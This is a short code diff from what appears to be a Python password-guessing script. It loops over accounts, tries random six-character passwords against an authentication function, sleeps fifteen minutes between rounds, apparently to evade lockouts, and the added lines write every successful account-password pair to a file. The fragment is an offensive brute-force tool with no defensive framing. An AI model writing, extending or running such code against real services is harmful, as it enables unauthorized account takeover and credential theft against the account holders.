@@ -57,7 +57,9 @@ if __name__ == '__main__':
         for account in accounts:
             for i in range (6):
                 password = random.sample(password_str,6)
-                auth_account(account, ''.join(password))
+                if auth_account(account, ''.join(password)):
+                    with open('accout_ha.txt','a+') as f:
+                        f.write('accout {} pwd {}'.format(account,password))
         print('睡眠中')
         time.sleep(60 * 15)
 
